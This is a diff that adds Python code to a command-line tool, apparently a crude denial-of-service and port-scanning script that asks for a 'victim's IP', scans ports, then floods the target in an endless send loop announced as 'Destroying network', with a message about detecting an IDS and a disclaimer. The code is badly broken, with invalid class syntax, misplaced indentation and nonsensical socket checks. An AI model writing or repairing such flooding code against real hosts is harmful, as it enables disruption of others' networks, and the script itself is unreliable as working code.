@@ -77,7 +77,49 @@ class Interface(Command):
         prsr.print_help()
         self.arg = prsr.parse_args()
         pass
+    
+class Show_Personal_Inf(self):
+    def Create():
+    dos = socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
+    vic =  raw_input("Enter in the victim's IP->\t")
+    port = input("Enter the port number, HTTP or HTTPS/FTP/NETBIOS")
+    datetime.datetime.now()
+    dos.connect((vic , port))
+    for Pport in port:
+        (print "[!]The targeted ports" + Pport)
+        dos.connect_ex((vic, port))
+        dos.close()
+        if dos != 1:
+            print ("[-]Port closed: " + Pport)
+        elif dos == 1:
+            print ("Port open:" + Pport)
+            return 1
 
+
+    print "Victim information below:\n"
+    print(socket.getaddrinfo(vic, port))
+    print "[!] Your information" , socket.gethostname()
+    print "[+]Destroying network" , vic
+    while True:
+        dos.send("500")
+        dos.recvfrom(66563)
+        dos.close()
+	if dos.recvfrom(1024):
+		print ("[+]WARNING, IDS DETECTED SHUTTING DOWN")
+
+def warn():
+    u = miniupnpc.UPnP()
+    u.discoverdelay = 200
+    u.discover()
+    u.selectigd()
+    print('external ip address: {}'.format(u.externalipaddress()))
+    print(
+    """
+    I am not responsible for misusage and/or illegal activities done within your enviroment
+    This tool is created to aid professinals and/or to educate others.
+
+    """
+    )
 
 test = Interface()
 test.port_scn()
